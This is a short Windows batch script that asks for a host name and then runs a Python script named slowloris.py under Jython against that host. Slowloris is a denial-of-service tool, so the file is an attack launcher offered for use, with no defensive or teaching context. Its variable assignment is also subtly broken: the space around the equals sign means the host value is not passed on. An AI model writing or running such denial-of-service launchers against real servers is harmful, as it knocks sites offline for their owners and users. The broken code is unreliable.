@echo off
set /p hostname = Host:
java -jar jython-standalone-2.7.0.jar slowloris.py host %hostname%
